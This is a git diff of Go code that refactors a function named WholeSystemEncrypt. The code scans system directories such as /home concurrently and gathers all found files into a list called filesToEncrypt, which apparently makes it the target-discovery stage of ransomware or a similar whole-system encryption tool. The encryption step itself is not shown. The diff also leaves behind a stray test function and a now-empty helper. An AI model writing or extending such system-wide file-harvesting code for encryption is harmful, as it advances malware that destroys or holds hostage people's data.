@@ -21,8 +21,8 @@ func WholeSystemEncrypt() {
 
 	//set variables
 	var (
-		filesToEncrypt   []string
-		sizeOfFoundFiles int64
+		filesToEncrypt []string
+		// sizeOfFoundFiles int64
 	)
 	dirsToScan := []string{
 		"/home",
@@ -41,50 +41,66 @@ func WholeSystemEncrypt() {
 	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
 	wg := sync.WaitGroup{}
 	wg.Add(len(dirsToScan))
-	chanFile := make(chan []string)
-	chanSize := make(chan int64)
+
+	var chanFilesScanned = make(chan []string)
 
 	for _, dir := range dirsToScan {
 
-		var dirsToScan []string
-		//get first 2 levels of dirs
-		//2d slice of strings
-		type dirTree struct {
-			level int
-			path  string
-		}
-		var dirsInLevels []dirTree
+		// go testt(dir, &wg, chanFilesScanned)
+		go func(dir string, wg *sync.WaitGroup, chanFilesScanned chan<- []string) {
+			_, err := os.Stat(dir)
+			if err != nil {
+				if os.IsNotExist(err) {
+					fmt.Println("Dir does not exist: ", dir)
+					wg.Done()
+				}
+			} else {
+				pl("Scanning: ", dir)
+				files, size := scan.ScanNoSideEffects(dir, true)
+				//send files to channel
+				chanFilesScanned <- files
 
-		pl("dirsToScan: ", dirsToScan)
-		pl("dirsInLevels: ", dirsInLevels)
-
-		//TODO extract to "scanDirGoRoutine"
-		// go scanDirGoRoutine(dir, &wg, chanFile, chanSize)
+				pl("Size of found files in: ", dir, " is ", humanize.Bytes(uint64(size)))
+			}
+		}(dir, &wg, chanFilesScanned)
 
 	}
-	//wait for all go routines to finish
-	//TODO extract to "WaitForScanDirGoRoutines"
+	//listen for channel and append to filesToEncrypt
 	go func() {
 		for {
 			select {
-			case files := <-chanFile:
+			case files := <-chanFilesScanned:
 				filesToEncrypt = append(filesToEncrypt, files...)
-			case size := <-chanSize:
-				sizeOfFoundFiles += size
+				wg.Done()
 			}
 		}
 	}()
 
 	wg.Wait()
-	close(chanFile)
-	close(chanSize)
 
 	timeEnd := time.Now()
-	pl("TOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
+	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
 	//print human readable size
-	pl("TOTAL size of found files: ", humanize.Bytes(uint64(sizeOfFoundFiles)))
 	pl("Time elapsed: ", timeEnd.Sub(timeNow))
 
+}
+
+func testt(dir string, wg *sync.WaitGroup, chanFilesScanned chan []string) {
+
+	_, err := os.Stat(dir)
+	if err != nil {
+		if os.IsNotExist(err) {
+			fmt.Println("Dir does not exist: ", dir)
+		}
+	} else {
+		pl("Scanning: ", dir)
+		files, size := scan.ScanNoSideEffects(dir, true)
+		//send files to channel
+		chanFilesScanned <- files
+
+		pl("Size of found files in: ", dir, " is ", humanize.Bytes(uint64(size)))
+	}
+	defer wg.Done()
 }
 
 func generateListOfDirsToScan(dirsToScan []string, dirsToRemove []string) []string {
@@ -100,20 +116,6 @@ func generateListOfDirsToScan(dirsToScan []string, dirsToRemove []string) []stri
 
 func scanDirGoRoutine(dir string, wg *sync.WaitGroup, chanFile chan []string, chanSize chan int64) {
 
-	_, err := os.Stat(dir)
-	if err != nil {
-		if os.IsNotExist(err) {
-			fmt.Println("Dir does not exist: ", dir)
-		}
-	} else {
-		pl("Scanning: ", dir)
-		files, size := scan.ScanNoSideEffects(dir, true)
-
-		chanFile <- files
-		chanSize <- size
-		pl("Size of found files in: ", dir, " is ", humanize.Bytes(uint64(size)))
-	}
-	wg.Done()
 }
 
 func removeDirsFromList(dirsToRemove []string, dirsToScan []string) []string {
